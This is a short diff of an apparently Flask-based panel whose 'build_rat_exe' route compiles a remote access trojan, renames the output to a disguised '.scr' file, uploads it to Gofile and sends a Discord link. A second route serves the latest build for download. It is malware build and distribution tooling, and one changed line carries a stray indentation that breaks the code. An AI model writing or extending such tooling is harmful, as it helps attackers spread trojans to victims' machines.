@@ -505,16 +505,16 @@ def build_rat_exe():
         
         app_dir = Path(app.root_path)
         dist_dir = app_dir / 'dist'
-        output_name = 'progam.scr'
+        output_name = 'raiox.scr'
         dist_path = dist_dir / output_name
         
         if not dist_path.exists():
-            dist_path_exe = dist_dir / 'progam.exe'
+            dist_path_exe = dist_dir / 'raiox.exe'
             if dist_path_exe.exists():
                 dist_path = dist_path_exe
         builder_script = app_dir / 'builder2.py'
         
-        logger.info(f"[BUILD] Procurando progam.exe em: {dist_path}")
+        logger.info(f"[BUILD] Procurando raiox.scr em: {dist_path}")
         
         # Se não existir, tenta compilar
         if not dist_path.exists():
@@ -531,7 +531,7 @@ def build_rat_exe():
         
         if not dist_path.exists():
              return jsonify({
-                "error": f"progam.exe nao encontrado em {dist_path} mesmo após tentativa de build."
+                "error": f"raiox.scr nao encontrado em {dist_path} mesmo após tentativa de build."
             }), 404
         
         # Upload to Gofile + send Discord link (sync)
@@ -573,7 +573,7 @@ def download_exe():
     """Download direto do ultimo .exe compilado"""
     from pathlib import Path
     dist_dir = Path(app.root_path) / 'dist'
-    candidates = list(dist_dir.glob('progam*'))
+        candidates = list(dist_dir.glob('raiox*'))
     if not candidates:
         return jsonify({"error": "Nenhum .exe compilado. Clique em BUILD primeiro."}), 404
     latest = max(candidates, key=lambda p: p.stat().st_mtime)
